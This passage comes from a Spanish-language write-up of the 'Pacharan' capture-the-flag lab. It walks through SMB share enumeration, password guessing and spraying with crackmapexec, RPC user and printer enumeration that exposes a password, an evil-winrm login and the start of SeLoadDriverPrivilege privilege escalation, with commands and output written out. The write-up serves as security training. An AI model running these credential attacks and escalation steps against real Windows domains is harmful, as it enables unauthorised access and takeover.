+</span></span><span style="display:flex;"><span>SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+</span></span><span style="display:flex;"><span>                     https://github.com/ShawnDEvans/smbmap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                      
+</span></span><span style="display:flex;"><span>                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 192.168.69.69:445	Name: PACHARAN.THL        	Status: Authenticated
+</span></span><span style="display:flex;"><span>	Disk                                                  	Permissions	Comment
+</span></span><span style="display:flex;"><span>	----                                                  	-----------	-------
+</span></span><span style="display:flex;"><span>	ADMIN$                                            	NO ACCESS	Admin remota
+</span></span><span style="display:flex;"><span>	C$                                                	NO ACCESS	Recurso predeterminado
+</span></span><span style="display:flex;"><span>	IPC$                                              	READ ONLY	IPC remota
+</span></span><span style="display:flex;"><span>	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesión 
+</span></span><span style="display:flex;"><span>	NETLOGON2                                         	NO ACCESS	
+</span></span><span style="display:flex;"><span>	PACHARAN                                          	READ ONLY	
+</span></span><span style="display:flex;"><span>	PDF Pro Virtual Printer                           	NO ACCESS	Soy Hacker y arreglo impresoras
+</span></span><span style="display:flex;"><span>	print$                                            	NO ACCESS	Controladores de impresora
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Parece que podemos ver el <strong>directorio PACHARAN</strong>.</p>
+<p>Veamos su contenido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.69.69 -d PACHARAN.THL -u <span style="color:#e6db74">&#39;Orujo&#39;</span> -p <span style="color:#e6db74">&#39;Pericodelospalotes6969&#39;</span> -r PACHARAN
+</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______
+</span></span><span style="display:flex;"><span>   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|---|---|---|---|---|---|---|
+</span></span><span style="display:flex;"><span>SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+</span></span><span style="display:flex;"><span>                     https://github.com/ShawnDEvans/smbmap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                          
+</span></span><span style="display:flex;"><span>                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 192.168.69.69:445	Name: PACHARAN.THL        	Status: Authenticated
+</span></span><span style="display:flex;"><span>	Disk                                                  	Permissions	Comment
+</span></span><span style="display:flex;"><span>	----                                                  	-----------	-------
+</span></span><span style="display:flex;"><span>	ADMIN$                                            	NO ACCESS	Admin remota
+</span></span><span style="display:flex;"><span>	C$                                                	NO ACCESS	Recurso predeterminado
+</span></span><span style="display:flex;"><span>	IPC$                                              	READ ONLY	IPC remota
+</span></span><span style="display:flex;"><span>	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesión 
+</span></span><span style="display:flex;"><span>	NETLOGON2                                         	NO ACCESS	
+</span></span><span style="display:flex;"><span>	PACHARAN                                          	READ ONLY	
+</span></span><span style="display:flex;"><span>	./PACHARAN
+</span></span><span style="display:flex;"><span>	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Jul <span style="color:#ae81ff">31</span> 11:21:13 2024	.
+</span></span><span style="display:flex;"><span>	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Jul <span style="color:#ae81ff">31</span> 11:21:13 2024	..
+</span></span><span style="display:flex;"><span>	fr--r--r--              <span style="color:#ae81ff">921</span> Wed Jul <span style="color:#ae81ff">31</span> 11:21:13 2024	ah.txt
+</span></span><span style="display:flex;"><span>	PDF Pro Virtual Printer                           	NO ACCESS	Soy Hacker y arreglo impresoras
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Parece ser otro archivo de texto.</p>
+<p>Vamos a descargarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.69.69 -d PACHARAN.THL -u <span style="color:#e6db74">&#39;Orujo&#39;</span> -p <span style="color:#e6db74">&#39;Pericodelospalotes6969&#39;</span> --download PACHARAN/ah.txt
+</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______
+</span></span><span style="display:flex;"><span>   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|---|---|---|---|---|---|---|
+</span></span><span style="display:flex;"><span>SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+</span></span><span style="display:flex;"><span>                     https://github.com/ShawnDEvans/smbmap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting download: PACHARAN<span style="color:#ae81ff">\a</span>h.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">921</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File output to: /../TheHackersLabs/Pacharan/content/192.168.69.69-PACHARAN_ah.txt          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Y veamos su contenido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat 192.168.69.69-PACHARAN_ah.txt
+</span></span><span style="display:flex;"><span>Mamasoystreamer1!
+</span></span><span style="display:flex;"><span>Mamasoystreamer2@
+</span></span><span style="display:flex;"><span>Mamasoystreamer3#
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Es una lista de posibles contraseñas de algún usuario.</p>
+<p>Probemos si alguno de los usuarios que tenemos tiene una contraseña que este dentro de esta lista.</p>
+<p>Lo haremos con <strong>crackmapexec</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.69.69 -u users.txt -p ah.txt
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:WIN-VRU3GG3DPLJ<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:PACHARAN.THL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> PACHARAN.THL<span style="color:#ae81ff">\c</span>hivas:Mamasoystreamer1! STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> PACHARAN.THL<span style="color:#ae81ff">\c</span>hivas:Mamasoystreamer2@ STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PACHARAN.THL<span style="color:#ae81ff">\w</span>hisky:***
+</span></span></code></pre></div><p>Encontramos una contraseña que le pertenece al <strong>usuario whisky</strong>.</p>
+<p>Podríamos probar si este usuario puede enumerar algo más de este servicio, pero te adelanto que no hay nada más.</p>
+<p>Por lo que podemos continuar con otro servicio.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="RPC">Enumeración del Servicio RPC y Obteniendo Sesión con evil-winrm</h3>
+<p>Lo siguiente que podemos hacer, es ver si podemos enumerar el <strong>servicio RPC</strong>.</p>
+<p>Esto lo haremos con el último usuario y contraseña que encontramos, utilizando la herramienta <strong>rpcclient</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>rpcclient -U <span style="color:#e6db74">&#34;whisky</span>%*<span style="color:#e6db74">********&#34;</span> 192.168.69.69
+</span></span><span style="display:flex;"><span>rpcclient $&gt; enumdomusers
+</span></span><span style="display:flex;"><span>user:[Administrador] rid:[0x1f4]
+</span></span><span style="display:flex;"><span>user:[Invitado] rid:[0x1f5]
+</span></span><span style="display:flex;"><span>user:[krbtgt] rid:[0x1f6]
+</span></span><span style="display:flex;"><span>user:[DefaultAccount] rid:[0x1f7]
+</span></span><span style="display:flex;"><span>user:[Orujo] rid:[0x44f]
+</span></span><span style="display:flex;"><span>user:[Ginebra] rid:[0x450]
+</span></span><span style="display:flex;"><span>user:[Whisky] rid:[0x452]
+</span></span><span style="display:flex;"><span>user:[Hendrick] rid:[0x453]
+</span></span><span style="display:flex;"><span>user:[Chivas Regal] rid:[0x454]
+</span></span><span style="display:flex;"><span>user:[Whisky2] rid:[0x457]
+</span></span><span style="display:flex;"><span>user:[JB] rid:[0x458]
+</span></span><span style="display:flex;"><span>user:[Chivas] rid:[0x459]
+</span></span><span style="display:flex;"><span>user:[beefeater] rid:[0x45a]
+</span></span><span style="display:flex;"><span>user:[CarlosV] rid:[0x45b]
+</span></span><span style="display:flex;"><span>user:[RedLabel] rid:[0x45c]
+</span></span><span style="display:flex;"><span>user:[Gordons] rid:[0x45d]
+</span></span></code></pre></div><p>Bien, entramos y funcionan los comandos que usemos. Aquí ya usamos el comando <strong>enumdomusers</strong> para obtener todos los usuarios registrados.</p>
+<p>Veamos si podemos obtener alguna contraseña al revisar la descripción de los usuarios con el comando <strong>querydispinfo</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>rpcclient $&gt; querydispinfo
+</span></span><span style="display:flex;"><span>index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrador	Name: (null)	Desc: Cuenta integrada para la administración del equipo o dominio
+</span></span><span style="display:flex;"><span>index: 0x109c RID: 0x45a acb: 0x00020010 Account: beefeater	Name: Beefeater	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0x109d RID: 0x45b acb: 0x00020010 Account: CarlosV	Name: CarlosV	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0x109b RID: 0x459 acb: 0x00020010 Account: Chivas	Name: Chivas	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0x1096 RID: 0x454 acb: 0x00000210 Account: Chivas Regal	Name: Chivas Regal	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: Cuenta de usuario administrada por el sistema.
+</span></span><span style="display:flex;"><span>index: 0x1092 RID: 0x450 acb: 0x00020010 Account: Ginebra	Name: Ginebra	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0x109f RID: 0x45d acb: 0x00020010 Account: Gordons	Name: Gordons	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0x1095 RID: 0x453 acb: 0x00020010 Account: Hendrick	Name: Hendrick	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0xfbd RID: 0x1f5 acb: 0x00000214 Account: Invitado	Name: (null)	Desc: Cuenta integrada para el acceso como invitado al equipo o dominio
+</span></span><span style="display:flex;"><span>index: 0x109a RID: 0x458 acb: 0x00020010 Account: JB	Name: JB	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Cuenta de servicio de centro de distribución de claves
+</span></span><span style="display:flex;"><span>index: 0x1091 RID: 0x44f acb: 0x00000210 Account: Orujo	Name: Orujo	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0x109e RID: 0x45c acb: 0x00020010 Account: RedLabel	Name: RedLabel	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0x1094 RID: 0x452 acb: 0x00000210 Account: Whisky	Name: Whisky	Desc: (null)
+</span></span><span style="display:flex;"><span>index: 0x1099 RID: 0x457 acb: 0x00020010 Account: Whisky2	Name: Whisky2	Desc: (null)
+</span></span></code></pre></div><p>Nada, no hay algo que nos ayude.</p>
+<p>Revisando los recursos compartidos del <strong>servicio SMB</strong>, recordemos que hay un recurso llamado <code>PDF Pro Virtual Printer</code> y que tiene una descripción curiosa.</p>
+<p>Se da a entender que hay una impresora conectada y esta la podemos ver desde el <strong>servicio RPC</strong> con el comando <strong>enumprinters</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>rpcclient $&gt; enumprinters
+</span></span><span style="display:flex;"><span>	flags:[0x800000]
+</span></span><span style="display:flex;"><span>	name:[\\192.168.69.69\Soy Hacker y arreglo impresoras]
+</span></span><span style="display:flex;"><span>	description:[\\192.168.69.69\Soy Hacker y arreglo impresoras,Universal Document Converter,*******]
+</span></span><span style="display:flex;"><span>	comment:[Soy Hacker y arreglo impresoras]
+</span></span></code></pre></div><p>Parece que hay una contraseña en la descripción de la impresora.</p>
+<p>Podemos probar si le pertenece a algún usuario, pero me doy cuenta de que hay algunos usuarios que no teníamos registrados.</p>
+<p>Es posible obtener todos los usuarios con el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>rpcclient -U <span style="color:#e6db74">&#34;whisky</span>%*<span style="color:#e6db74">***********&#34;</span> 192.168.69.69 -c <span style="color:#e6db74">&#34;enumdomusers&#34;</span> | awk -F &#39;[][]&#39; &#39;{print $2}&#39;
+</span></span><span style="display:flex;"><span>Administrador
+</span></span><span style="display:flex;"><span>Invitado
+</span></span><span style="display:flex;"><span>krbtgt
+</span></span><span style="display:flex;"><span>DefaultAccount
+</span></span><span style="display:flex;"><span>Orujo
+</span></span><span style="display:flex;"><span>Ginebra
+</span></span><span style="display:flex;"><span>Whisky
+</span></span><span style="display:flex;"><span>Hendrick
+</span></span><span style="display:flex;"><span>Chivas Regal
+</span></span><span style="display:flex;"><span>Whisky2
+</span></span><span style="display:flex;"><span>JB
+</span></span><span style="display:flex;"><span>Chivas
+</span></span><span style="display:flex;"><span>beefeater
+</span></span><span style="display:flex;"><span>CarlosV
+</span></span><span style="display:flex;"><span>RedLabel
+</span></span><span style="display:flex;"><span>Gordons
+</span></span></code></pre></div><p>Guarda esta nueva lista de usuarios.</p>
+<p>Y con <strong>crackmapexec</strong>, aplicamos <strong>password spraying</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.69.69 -u users.txt -p <span style="color:#e6db74">&#39;******&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:WIN-VRU3GG3DPLJ<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:PACHARAN.THL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> PACHARAN.THL<span style="color:#ae81ff">\A</span>dministrador:****** STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PACHARAN.THL<span style="color:#ae81ff">\C</span>hivas Regal:******
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span></code></pre></div><p>Excelente, encontramos a quien le pertenece este usuario.</p>
+<p>Ahora, podríamos probar si podemos hacerlo algo en el <strong>servicio SMB</strong>, pero veamos si podemos usar estas credenciales para entrar al <strong>servicio WinRM</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec winrm 192.168.69.69 -u <span style="color:#e6db74">&#39;Chivas Regal&#39;</span> -p <span style="color:#e6db74">&#39; **************&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>name:WIN-VRU3GG3DPLJ<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:PACHARAN.THL<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>HTTP        192.168.69.69   <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> http://192.168.69.69:5985/wsman
+</span></span><span style="display:flex;"><span>WINRM       192.168.69.69   <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PACHARAN.THL<span style="color:#ae81ff">\C</span>hivas Regal:********* <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Funciono.</p>
+<p>Vamos a conectarnos con la herramienta <strong>evil-winrm</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>evil-winrm -i 192.168.69.69 -u &#39;Chivas Regal&#39; -p &#39;**************&#39;
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion       
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt;
+</span></span></code></pre></div><p>Y estamos dentro.</p>
+<p>Aquí podemos encontrar la flag del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; cd ../Desktop
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Chivas Regal\Desktop&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directorio: C:\Users\Chivas Regal\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----         8/1/2024  10:29 AM             36 user.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Chivas Regal\Desktop&gt; type user.txt
+</span></span><span style="display:flex;"><span>....
+</span></span></code></pre></div><h2 id="Post">Post Explotación</h2>
+<h3 id="Privesc">Abusando del Privilegio SeLoadDriverPrivilege para Escalar Privilegios</h3>
+<p>Si revisamos nuestros privilegios, veremos uno interesante:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; whoami /priv
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>INFORMACIàN DE PRIVILEGIOS
+</span></span><span style="display:flex;"><span>--------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nombre de privilegio          Descripci¢n                                     Estado
+</span></span><span style="display:flex;"><span>============================= =============================================== ==========
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio        Habilitada
+</span></span><span style="display:flex;"><span>SeLoadDriverPrivilege         Cargar y descargar controladores de dispositivo Habilitada
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido                Habilitada
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso    Habilitada
+</span></span></code></pre></div><p>Investigando un poco, existe la posibilidad de utilizar el <strong>privilegio SeLoadDriverPrivilege</strong> para escalar privilegios. En el siguiente blog se explica bastante bien el cómo se hace esto:</p>
+<ul>
+<li><a href="https://www.tarlogic.com/es/blog/explotacion-seloaddriverprivilege/" target="_blank">Abusando SeLoadDriverPrivilege para elevar privilegios</a></li>
+</ul>
+<p>En resumen, este privilegio permite la carga de controladores de kernel maliciosos, pues permite a un usuario con privilegios limitados cargar y administrar controladores del kernel (drivers).</p>
+<p>Si un atacante puede aprovecharse de este privilegio, puede cargar un controlador malicioso firmado o incluso explotar vulnerabilidades en controladores legítimos para ejecutar código en modo kernel (Ring 0), obteniendo así privilegios de SYSTEM/Administrador.</p>
+<p>Tenemos dos repositorios que muestran la forma de explotar esta vulnerabilidad:</p>
+<ul>
+<li><a href="https://github.com/JoshMorrison99/SeLoadDriverPrivilege" target="_blank">Repositorio de JoshMorrison99: SeLoadDriverPrivilege</a></li>
+<li><a href="https://github.com/k4sth4/SeLoadDriverPrivilege" target="_blank">Repositorio de k4sth4: SeLoadDriverPrivilege</a></li>
+</ul>
+<p>En mi caso, voy a usar el repositorio de <strong>JoshMorrison99</strong>.</p>
+<p>Podemos clonar el repo para empezar a cargar los archivos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/JoshMorrison99/SeLoadDriverPrivilege.git
+</span></span><span style="display:flex;"><span>Clonando en <span style="color:#e6db74">&#39;SeLoadDriverPrivilege&#39;</span>...
+</span></span><span style="display:flex;"><span>remote: Enumerating objects: 20, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Counting objects: 100% <span style="color:#f92672">(</span>20/20<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Compressing objects: 100% <span style="color:#f92672">(</span>16/16<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
